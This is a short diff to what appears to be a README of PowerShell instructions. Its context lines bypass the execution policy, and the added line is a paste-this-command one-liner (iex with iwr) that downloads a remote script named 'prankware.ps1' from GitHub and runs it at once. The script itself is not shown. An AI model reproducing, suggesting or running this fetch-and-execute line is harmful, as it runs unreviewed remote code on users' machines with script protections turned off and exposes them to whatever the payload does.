@@ -22,4 +22,5 @@ Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
 ```
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 ```
-
+```
+iex (iwr "https://raw.githubusercontent.com/xtofuub/PrankWare/refs/heads/main/prankware.ps1")
